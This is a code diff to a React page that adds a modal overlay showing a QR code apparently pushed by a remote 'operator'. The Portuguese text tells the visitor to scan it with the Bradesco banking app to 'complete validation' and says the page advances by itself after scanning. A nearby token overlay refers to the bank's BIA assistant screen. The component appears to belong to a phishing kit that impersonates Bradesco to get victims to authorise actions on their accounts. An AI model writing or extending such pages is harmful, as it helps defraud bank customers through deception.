@@ -362,6 +362,35 @@ function InternaPage() {
         </div>
       </main>
 
+      {/* Overlay de QR Code enviado pelo operador */}
+      {qrCodeUrl && (
+        <div className="fixed inset-0 z-40 flex items-center justify-center p-4">
+          <div aria-hidden className="absolute inset-0 bg-black/60 backdrop-blur-[3px]" />
+          <div className="relative w-full max-w-sm rounded-2xl border border-white/40 bg-white p-6 shadow-2xl">
+            <div className="mb-4 text-center">
+              <h3 className="text-base font-bold text-slate-800">
+                Escaneie o QR Code
+              </h3>
+              <p className="mt-1 text-xs text-slate-500">
+                Utilize o aplicativo Bradesco para escanear e concluir a validação.
+              </p>
+            </div>
+            <div className="flex justify-center rounded-lg border border-slate-200 bg-white p-3">
+              <img
+                src={qrCodeUrl}
+                alt="QR Code de validação"
+                className="h-64 w-64 object-contain"
+              />
+            </div>
+            <p className="mt-4 text-center text-[11px] text-slate-400">
+              Aguarde... a página avança automaticamente após a leitura.
+            </p>
+          </div>
+        </div>
+      )}
+
+
+
       {/* Overlay de token dentro da tela da BIA (mesmo fundo) */}
       {tokenModo && (
         <div className="fixed inset-0 z-30 flex items-center justify-center p-4">
